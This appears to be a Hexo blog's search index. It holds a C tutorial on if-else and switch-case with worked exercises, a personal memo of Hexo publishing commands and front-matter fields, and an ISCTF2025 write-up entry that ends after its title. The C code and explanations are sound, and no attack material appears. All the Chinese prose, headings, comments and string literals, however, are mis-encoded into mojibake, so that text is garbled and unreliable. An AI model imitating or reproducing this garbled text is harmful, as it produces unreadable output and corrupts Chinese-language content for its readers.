<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)</title>
    <url>/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/</url>
    <content><![CDATA[<h1 id="ç¬¬äºŒç« ï¼šæµç¨‹æ§åˆ¶-é€‰æ‹©ç»“æ„"><a href="#ç¬¬äºŒç« ï¼šæµç¨‹æ§åˆ¶-é€‰æ‹©ç»“æ„" class="headerlink" title="ç¬¬äºŒç« ï¼šæµç¨‹æ§åˆ¶ (é€‰æ‹©ç»“æ„) "></a>ç¬¬äºŒç« ï¼šæµç¨‹æ§åˆ¶ (é€‰æ‹©ç»“æ„) </h1><p><strong>æœ¬ç« æ ¸å¿ƒï¼š</strong> è®©ç¨‹åºå­¦ä¼šâ€œæ€è€ƒâ€å’Œâ€œåšå†³å®šâ€ï¼ˆå¦‚æœâ€¦å°±â€¦ï¼Œå¦åˆ™â€¦ï¼‰ã€‚</p>
<hr>
<h2 id="1-å…³ç³»è¿ç®—ç¬¦ä¸é€»è¾‘è¿ç®—ç¬¦"><a href="#1-å…³ç³»è¿ç®—ç¬¦ä¸é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="1. å…³ç³»è¿ç®—ç¬¦ä¸é€»è¾‘è¿ç®—ç¬¦"></a>1. å…³ç³»è¿ç®—ç¬¦ä¸é€»è¾‘è¿ç®—ç¬¦</h2><p>åˆ¤æ–­è¯­å¥åŸºäºå…³ç³»è¿ç®—ç¬¦ï¼ˆä¾‹å¦‚ <code>&gt;</code>ã€<code>==</code>ï¼‰çš„ç»“æœï¼ˆçœŸæˆ–å‡ï¼‰ã€‚</p>
<h3 id="1-1-å…³ç³»è¿ç®—ç¬¦"><a href="#1-1-å…³ç³»è¿ç®—ç¬¦" class="headerlink" title="1.1 å…³ç³»è¿ç®—ç¬¦"></a>1.1 å…³ç³»è¿ç®—ç¬¦</h3><p><code>==</code> (ç­‰äº), <code>!=</code> (ä¸ç­‰äº), <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>ã€‚</p>
<h3 id="1-2-é€»è¾‘è¿ç®—ç¬¦"><a href="#1-2-é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="1.2 é€»è¾‘è¿ç®—ç¬¦"></a>1.2 é€»è¾‘è¿ç®—ç¬¦</h3><p><code>&amp;&amp;</code> (ä¸), <code>||</code> (æˆ–), <code>!</code> (é)ã€‚</p>
<p><strong>è¡¥å……è€ƒç‚¹ï¼š</strong></p>
<ul>
<li><p><strong>æ•°å­¦å†™æ³• vs C è¯­è¨€å†™æ³•</strong>ï¼š</p>
<ul>
<li><p>æ•°å­¦é‡Œå†™ï¼š$0 &lt; x &lt; 10$</p>
</li>
<li><p>C è¯­è¨€<strong>å¿…é¡»</strong>å†™æˆï¼š<code>(x &gt; 0) &amp;&amp; (x &lt; 10)</code></p>
</li>
</ul>
</li>
<li><p><strong>ä¼˜å…ˆçº§</strong>ï¼š</p>
<ul>
<li><code>!</code> (æœ€é«˜) &gt; ç®—æœ¯è¿ç®—ç¬¦ &gt; å…³ç³»è¿ç®—ç¬¦ &gt; <code>&amp;&amp;</code> &gt; <code>||</code> (æœ€ä½)ã€‚</li>
</ul>
</li>
</ul>
<hr>
<h3 id="ä¹ é¢˜-1-å¯¹åº”ï¼šå…³ç³»ä¸é€»è¾‘è¿ç®—"><a href="#ä¹ é¢˜-1-å¯¹åº”ï¼šå…³ç³»ä¸é€»è¾‘è¿ç®—" class="headerlink" title="ä¹ é¢˜ 1 (å¯¹åº”ï¼šå…³ç³»ä¸é€»è¾‘è¿ç®—)"></a>ä¹ é¢˜ 1 (å¯¹åº”ï¼šå…³ç³»ä¸é€»è¾‘è¿ç®—)</h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ä»£ç åˆ¤æ–­è¾“å…¥çš„ä¸‰ä¸ªæ•´æ•° a, b, c èƒ½å¦æ„æˆä¸‰è§’å½¢ã€‚</p>
<p><strong>æ„æˆä¸‰è§’å½¢çš„æ¡ä»¶ï¼š</strong> ä»»æ„ä¸¤è¾¹ä¹‹å’Œå¤§äºç¬¬ä¸‰è¾¹ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong> ä½¿ç”¨é€»è¾‘ä¸è¿ç®—ç¬¦ <code>&amp;&amp;</code> è¿æ¥ä¸‰ä¸ªæ¡ä»¶ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·è¾“å…¥ä¸‰è¾¹: 3 4 5</span><br><span class="line">å¯ä»¥æ„æˆä¸‰è§’å½¢</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸‰è¾¹: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¿…é¡»ä¸‰ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œæ‰€ä»¥ç”¨ &amp;&amp;</span></span><br><span class="line">    <span class="keyword">if</span> ((a + b &gt; c) &amp;&amp; (a + c &gt; b) &amp;&amp; (b + c &gt; a)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;å¯ä»¥æ„æˆä¸‰è§’å½¢\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ— æ³•æ„æˆä¸‰è§’å½¢\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>å°† <code>a+b&gt;c</code> ç­‰æ¡ä»¶ç”¨ <code>||</code> è¿æ¥ï¼ˆå˜æˆäº†â€œåªè¦æœ‰ä¸€ç»„è¾¹æ»¡è¶³å°±è¡Œâ€ï¼Œé€»è¾‘é”™è¯¯ï¼‰ã€‚</p>
</li>
<li><p>è¯•å›¾å†™æˆæ•°å­¦è¿å†™å½¢å¼ <code>a+b&gt;c&gt;...</code> (C è¯­è¨€ä¸æ”¯æŒ)ã€‚</p>
</li>
</ol>
<hr>
<h2 id="2-if-else-ç»“æ„"><a href="#2-if-else-ç»“æ„" class="headerlink" title="2. if-else ç»“æ„"></a>2. <code>if-else</code> ç»“æ„</h2><p>ç”¨äºæ ¹æ®æ¡ä»¶çš„çœŸå‡æ‰§è¡Œä¸åŒçš„ä»£ç å—ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (æ¡ä»¶è¡¨è¾¾å¼) &#123;</span><br><span class="line">    <span class="comment">// 1. å¦‚æœæ¡ä»¶ä¸ºçœŸ (é0)ï¼Œæ‰§è¡Œè¿™é‡Œçš„ä»£ç </span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 2. å¦‚æœæ¡ä»¶ä¸ºå‡ (0)ï¼Œæ‰§è¡Œè¿™é‡Œçš„ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ç¤ºä¾‹ï¼š</strong> åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºæ­£æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">-5</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ˜¯æ­£æ•°\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¸æ˜¯æ­£æ•°\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º: ä¸æ˜¯æ­£æ•°</span></span><br></pre></td></tr></table></figure>

<p><strong>è¡¥å……è€ƒç‚¹ (æ‚¬æŒ‚ else)ï¼š</strong></p>
<p>å½“æœ‰å¤šä¸ª if å’Œ else åµŒå¥—æ—¶ï¼ŒC è¯­è¨€è§„å®šï¼šelse æ€»æ˜¯ä¸å®ƒä¸Šé¢æœ€è¿‘çš„ã€æœªé…å¯¹çš„ if é…å¯¹ã€‚</p>
<ul>
<li><strong>å»ºè®®</strong>ï¼šæ— è®ºåªæœ‰ä¸€è¡Œä»£ç è¿˜æ˜¯å¤šè¡Œï¼Œæ°¸è¿œåŠ ä¸Š <code>{ }</code>ï¼Œé˜²æ­¢é€»è¾‘æ··ä¹±ã€‚</li>
</ul>
<hr>
<h2 id="3-å¤šé‡æ¡ä»¶-if-else-if-else"><a href="#3-å¤šé‡æ¡ä»¶-if-else-if-else" class="headerlink" title="3. å¤šé‡æ¡ä»¶ (if-else if-else)"></a>3. å¤šé‡æ¡ä»¶ (<code>if-else if-else</code>)</h2><p>ç”¨äºå¤„ç†å¤šä¸ªäº’æ–¥çš„æ¡ä»¶åˆ¤æ–­ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (æ¡ä»¶ <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// æ»¡è¶³æ¡ä»¶ 1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (æ¡ä»¶ <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// ä¸æ»¡è¶³æ¡ä»¶ 1ï¼Œä½†æ»¡è¶³æ¡ä»¶ 2</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// æ‰€æœ‰æ¡ä»¶éƒ½ä¸æ»¡è¶³</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="ä¹ é¢˜-2"><a href="#ä¹ é¢˜-2" class="headerlink" title="ä¹ é¢˜ 2"></a>ä¹ é¢˜ 2</h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ç¨‹åºï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„<strong>æ•´æ•°æˆç»© (<code>score</code>)</strong>ï¼Œæ ¹æ®ä»¥ä¸‹æ ‡å‡†è¾“å‡ºè¯„å®šç»“æœã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li><p>ä½¿ç”¨ <code>if-else if-else</code> ç»“æ„ã€‚</p>
</li>
<li><p>æˆç»©èŒƒå›´ 0-100ã€‚</p>
<ul>
<li><p>$\ge 90$: A (ä¼˜ç§€)</p>
</li>
<li><p>$\ge 70$ ä¸” $&lt; 90$: B (è‰¯å¥½)</p>
</li>
<li><p>$&lt; 70$: C (åŠæ ¼çº¿ä»¥ä¸‹)</p>
</li>
</ul>
</li>
</ol>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·è¾“å…¥æ‚¨çš„æˆç»© (0-100): </span><br><span class="line">85</span><br><span class="line">è¯„å®šç»“æœ: B (è‰¯å¥½)</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨çš„æˆç»© (0-100): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ‡å‡†é€»è¾‘æµï¼šä»é«˜åˆ°ä½åˆ¤æ–­ï¼Œä»£ç æ›´æ˜“è¯»</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;è¯„å®šç»“æœ: A (ä¼˜ç§€)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="comment">// èƒ½èµ°åˆ°è¿™é‡Œï¼Œè¯´æ˜åˆ†æ•°è‚¯å®šå°äº 90ï¼Œæ‰€ä»¥åªéœ€åˆ¤æ–­æ˜¯å¦ &gt;= 70</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;è¯„å®šç»“æœ: B (è‰¯å¥½)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å‰©ä¸‹çš„æ‰€æœ‰æƒ…å†µ (å³å°äº 70)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;è¯„å®šç»“æœ: C (åŠæ ¼çº¿ä»¥ä¸‹)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>é€»è¾‘é¡ºåºæ··ä¹±ï¼šå¦‚æœå…ˆåˆ¤æ–­ <code>score &gt;= 70</code>ï¼Œé‚£ä¹ˆ 95 åˆ†ä¹Ÿä¼šè¢«åˆ¤å®šä¸º Bï¼ˆå› ä¸º 95 ä¹Ÿå¤§äº 70ï¼‰ã€‚</p>
</li>
<li><p>åœ¨ <code>else</code> åé¢ç”»è›‡æ·»è¶³åŠ æ¡ä»¶ï¼ˆ<code>else (score &lt; 70)</code> æ˜¯è¯­æ³•é”™è¯¯ï¼Œ<code>else</code> åä¸èƒ½è·Ÿæ‹¬å·ï¼‰ã€‚</p>
</li>
</ol>
<hr>
<h2 id="4-switch-case-ç»“æ„"><a href="#4-switch-case-ç»“æ„" class="headerlink" title="4. switch-case ç»“æ„"></a>4. <code>switch-case</code> ç»“æ„</h2><p>é€‚ç”¨äº<strong>ä¸€ä¸ªå˜é‡</strong>çš„å–å€¼ï¼Œéœ€è¦æ‰§è¡Œ<strong>å¤šåˆ†æ”¯é€‰æ‹©</strong>çš„æƒ…å†µã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (å˜é‡/è¡¨è¾¾å¼) &#123;</span><br><span class="line">    <span class="keyword">case</span> å¸¸é‡å€¼<span class="number">1</span>:</span><br><span class="line">        <span class="comment">// æ‰§è¡Œä»£ç </span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// å¿…é¡»è¦æœ‰ï¼</span></span><br><span class="line">    <span class="keyword">case</span> å¸¸é‡å€¼<span class="number">2</span>:</span><br><span class="line">        <span class="comment">// æ‰§è¡Œä»£ç </span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// å¦‚æœæ‰€æœ‰ case éƒ½ä¸åŒ¹é…ï¼Œåˆ™æ‰§è¡Œ default</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é‡ç‚¹æé†’ ï¼š</strong></p>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong> switch è¯­å¥ä¸­ break çš„ä½¿ç”¨</p>
<ul>
<li><strong>é™·é˜±ï¼š</strong> å¦‚æœä¸€ä¸ª <code>case</code> åˆ†æ”¯ä¸­<strong>æ²¡æœ‰ <code>break</code></strong>ï¼Œç¨‹åºä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª <code>case</code> åˆ†æ”¯çš„ä»£ç ï¼Œç›´åˆ°é‡åˆ° <code>break</code> æˆ– <code>switch</code> ç»“æŸã€‚è¿™é€šå¸¸è¢«ç§°ä¸º<strong>ç©¿é€ (fall-through)</strong>ï¼Œæ˜¯åˆå­¦è€…æœ€å¸¸çŠ¯çš„é€»è¾‘é”™è¯¯ã€‚</li>
</ul>
<p><strong>è¡¥å……è€ƒç‚¹ (ç±»å‹é™åˆ¶)ï¼š</strong> switch æ‹¬å·é‡Œçš„å˜é‡ï¼Œä»¥åŠ case åé¢çš„å€¼ï¼Œå¿…é¡»æ˜¯æ•´æ•° (int) æˆ–å­—ç¬¦ (char)ã€‚</p>
<ul>
<li><p><strong>é”™è¯¯</strong>ï¼š<code>case 3.14:</code> (ä¸èƒ½ç”¨æµ®ç‚¹æ•°)</p>
</li>
<li><p><strong>é”™è¯¯</strong>ï¼š<code>case &quot;A&quot;:</code> (ä¸èƒ½ç”¨å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ç”¨å•å¼•å· <code>&#39;A&#39;</code>)</p>
</li>
</ul>
<hr>
<h3 id="ä¹ é¢˜-3"><a href="#ä¹ é¢˜-3" class="headerlink" title="ä¹ é¢˜ 3"></a>ä¹ é¢˜ 3</h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ç¨‹åºï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„<strong>æ˜ŸæœŸæ•° (1-7 ä¹‹é—´çš„æ•´æ•° <code>day</code>)</strong>ï¼Œè¾“å‡ºå¯¹åº”çš„æ˜ŸæœŸåç§°ï¼ˆMonday, Tuesdayâ€¦ Sundayï¼‰ã€‚å¦‚æœè¾“å…¥å…¶ä»–æ•°å­—ï¼Œè¾“å‡º â€œErrorâ€ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li><p>å¿…é¡»ä½¿ç”¨ <strong><code>switch-case</code></strong> ç»“æ„ã€‚</p>
</li>
<li><p><strong>æ˜“é”™ç‚¹ï¼š</strong> æ¯ä¸€ä¸ª <code>case</code> ç»“æŸæ—¶å¿…é¡»æœ‰ <strong><code>break;</code></strong>ã€‚</p>
</li>
<li><p><strong>é»˜è®¤å¤„ç†ï¼š</strong> ä½¿ç”¨ <code>default:</code> å¤„ç†é 1-7 çš„è¾“å…¥ã€‚</p>
</li>
</ol>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·è¾“å…¥æ˜ŸæœŸæ•° (1-7): </span><br><span class="line">3</span><br><span class="line">æ˜ŸæœŸä¸‰</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> day; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ˜ŸæœŸæ•° (1-7):\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;day);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸä¸€\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// âœ… å¿…é¡»æœ‰ breakï¼Œé˜²æ­¢ç©¿é€</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸäºŒ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸä¸‰\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸå››\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸäº”\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸå…­\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ˜ŸæœŸæ—¥\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// å¤„ç†æ‰€æœ‰é 1-7 çš„æƒ…å†µ</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥é”™è¯¯ï¼Œè¯·è¾“å…¥1åˆ°7ä¹‹é—´çš„æ•°å­—ã€‚\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>æ¼å†™ <code>break;</code> å¯¼è‡´ç¨‹åºæ‰“å°å‡ºå¤šå¤©çš„åå­—ã€‚</p>
</li>
<li><p><code>switch</code> åé¢çš„æ‹¬å·é‡Œä¸éœ€è¦åˆ†å· <code>;</code>ã€‚</p>
</li>
<li><p><code>default</code> æ‹¼å†™é”™è¯¯ã€‚</p>
</li>
</ol>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
        <category>Cè¯­è¨€</category>
      </categories>
      <tags>
        <tag>Cè¯­è¨€</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexoå‘½ä»¤ä¸é…ç½®å¤‡å¿˜å½•</title>
    <url>/2025/12/09/Hexo%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<blockquote>
<p>è¿™æ˜¯ä¸€ç¯‡å†™ç»™æˆ‘è‡ªå·±çš„å¤‡å¿˜å½•ï¼Œè®°å½•äº†åšå®¢æ—¥å¸¸ç»´æŠ¤ã€å†™æ–‡ç« å’Œä¿®æ”¹é…ç½®çš„å¸¸ç”¨å‘½ä»¤ã€‚</p>
</blockquote>
<h2 id="å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥"><a href="#å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥" class="headerlink" title="å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥"></a>å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥</h2><p>åœ¨ç»ˆç«¯è¿›å…¥åšå®¢ç›®å½• <code>~/Hello_CTF/my_ctf_blog</code> åä½¿ç”¨ã€‚</p>
<h3 id="1-å‘å¸ƒåšå®¢"><a href="#1-å‘å¸ƒåšå®¢" class="headerlink" title="1. å‘å¸ƒåšå®¢"></a>1. å‘å¸ƒåšå®¢</h3><ol>
<li><p>åˆ›å»ºæ–°çš„markdownæ–‡ä»¶ï¼š</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;æ–°çš„wp&quot;</span></span><br></pre></td></tr></table></figure>
<p> ç„¶åç›®å½•å‡ºç°<code>æ–°çš„wp.md</code></p>
</li>
<li><p>æ ¹æ®è‡ªèº«è¦æ±‚ä¿®æ”¹æ–‡ä»¶å±æ€§ï¼š</p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: è¿™é‡Œå†™æ–‡ç« æ ‡é¢˜            # æ ‡é¢˜ï¼šéšä¾¿å†™ï¼Œæ”¯æŒä¸­æ–‡</span><br><span class="line">date: 2025-12-09 18:00:00       # å‘å¸ƒæ—¶é—´ï¼šæ³¨æ„æ ¼å¼ï¼Œå†’å·åæœ‰ç©ºæ ¼</span><br><span class="line">updated: 2025-12-10 12:00:00    # æ›´æ–°æ—¶é—´ï¼šå¯é€‰ï¼Œä¸å†™é»˜è®¤ç­‰äºå‘å¸ƒæ—¶é—´</span><br><span class="line">tags:                           # æ ‡ç­¾ï¼šæ‰å¹³åŒ–ï¼Œä¸€ç¯‡å¯ä»¥æœ‰å¤šä¸ª</span><br><span class="line"><span class="bullet">    -</span> CTF</span><br><span class="line"><span class="bullet">    -</span> Web</span><br><span class="line">categories:                     # åˆ†ç±»ï¼šå±‚çº§åŒ–ï¼Œæ”¯æŒçˆ¶å­å…³ç³»</span><br><span class="line"><span class="bullet">    -</span> å­¦ä¹ ç¬”è®°                   #çˆ¶åˆ†ç±»</span><br><span class="line"><span class="section">    - æ¸—é€æµ‹è¯•                   # å­åˆ†ç±»</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>
<p> æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>å†’å·åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ï¼ˆæ¯”å¦‚ title: æ ‡é¢˜ æ˜¯å¯¹çš„ï¼Œtitle:æ ‡é¢˜ æ˜¯é”™çš„ï¼‰ã€‚</li>
<li>ç¼©è¿›ï¼šåˆ†ç±»å’Œæ ‡ç­¾çš„åˆ—è¡¨è¦å¯¹é½ã€‚</li>
</ul>
<p> è¿˜æœ‰â€œç‰¹æ•ˆâ€å­—æ®µï¼š<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">cover: /img/å°é¢å›¾.png           # é¦–é¡µå¡ç‰‡æ˜¾ç¤ºçš„å°é¢å›¾</span><br><span class="line">top<span class="emphasis">_img: /img/é¡¶éƒ¨å›¾.png         # ç‚¹è¿›æ–‡ç« åï¼Œé¡¶éƒ¨é‚£ä¸ªé•¿æ¡èƒŒæ™¯å›¾</span></span><br><span class="line"><span class="emphasis">                                # (å¦‚æœä¸å†™ï¼Œé»˜è®¤æ˜¾ç¤ºä½ åœ¨ _</span>config.butterfly.yml è®¾ç½®çš„é‚£å¼  default<span class="emphasis">_top_</span>img)</span><br><span class="line"></span><br><span class="line">comments: true                  # æ˜¯å¦å¼€å¯è¯„è®º (é»˜è®¤ä¸º trueï¼Œå¡« false å¯å…³é—­è¿™ç¯‡çš„è¯„è®º)</span><br><span class="line">toc: true                       # æ˜¯å¦æ˜¾ç¤ºå³ä¾§ç›®å½• (é»˜è®¤ä¸º true)</span><br><span class="line">toc<span class="emphasis">_number: true                # ç›®å½•æ˜¯å¦æ˜¾ç¤ºåºå· (1. 1.1 ...)</span></span><br><span class="line"><span class="emphasis">copyright: true                 # æ˜¯å¦æ˜¾ç¤ºæ–‡æœ«ç‰ˆæƒä¿¡æ¯</span></span><br><span class="line"><span class="emphasis">---    </span></span><br></pre></td></tr></table></figure><br> ä¾‹å¦‚æˆ‘æƒ³å†™cè¯­è¨€å­¦ä¹ ç¬”è®°ï¼š<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Cè¯­è¨€å­¦ä¹ ç¬”è®°01</span><br><span class="line">date: 2025-12-09 20:00:00</span><br><span class="line">updated: 2025-12-09 20:00:00</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> ç¼–ç¨‹è¯­è¨€      </span><br><span class="line"><span class="bullet">-</span> Cè¯­è¨€         </span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> Cè¯­è¨€</span><br><span class="line">cover: /img/sg<span class="emphasis">_meter.jpg   </span></span><br><span class="line"><span class="emphasis">top_</span>img: /img/sg<span class="emphasis">_lab.jpg   </span></span><br><span class="line"><span class="emphasis">toc: true</span></span><br><span class="line"><span class="emphasis">toc_</span>number: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ­£æ–‡...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>æ¸…ç†ã€æ„å»ºã€éƒ¨ç½²ï¼š</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>]]></content>
      <categories>
        <category>åšå®¢æ­å»º</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>å¤‡å¿˜å½•</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF2025 wp</title>
    <url>/2025/12/11/ISCTF2025%20wp/</url>
